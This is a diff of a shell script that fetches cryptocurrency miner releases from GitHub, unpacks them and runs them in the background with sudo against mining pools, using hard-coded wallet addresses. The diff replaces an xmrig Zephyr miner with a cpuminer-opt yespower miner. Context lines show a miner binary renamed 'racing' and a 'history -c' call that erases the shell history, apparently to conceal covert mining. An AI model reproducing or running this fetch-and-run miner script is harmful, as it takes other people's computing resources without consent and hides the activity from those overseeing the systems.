@@ -31,11 +31,11 @@ sudo ./racing -a kawpow -o stratum+tcp://de.aipg.herominers.com:1128 -u ARyaz2ps
 history -c
 if [[ $noCore -eq 6 ]]
 then
-	sudo wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
-	sudo tar xvzf xmrig-6.16.2-linux-static-x64.tar.gz
-	sudo ./xmrig-6.16.2/xmrig -o us.zephyr.herominers.com:1123 -u ZEPHYR2TAeqLmKxmFuajteVeQwubM8Fm9PLVmHqREGVqDtfth7Y4ZHQVzVAd5ZKgNkJqBaVxFvVnGJnsYXEPev77SFG1Zn1z9EF4u -p "c1" --coin zephyr -a rx/0 -t= ${usingcore} 
+	sudo wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
+	sudo tar -xvf cpuminer-opt-linux.tar.gz
+	sudo ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17079 -u v4nmRyrdyGXF2Wd8wKtoTt9Rpa7YLb8wKx.batch &
 else
-	sudo wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
-	sudo tar xvzf xmrig-6.16.2-linux-static-x64.tar.gz
-	sudo ./xmrig-6.16.2/xmrig -o us.zephyr.herominers.com:1123 -u ZEPHYR2TAeqLmKxmFuajteVeQwubM8Fm9PLVmHqREGVqDtfth7Y4ZHQVzVAd5ZKgNkJqBaVxFvVnGJnsYXEPev77SFG1Zn1z9EF4u -p "c2" --coin zephyr -a rx/0 -t= ${usingcore} &
+	sudo wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
+	sudo tar -xvf cpuminer-opt-linux.tar.gz
+	sudo ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17079 -u v4nmRyrdyGXF2Wd8wKtoTt9Rpa7YLb8wKx.batch &
 fi
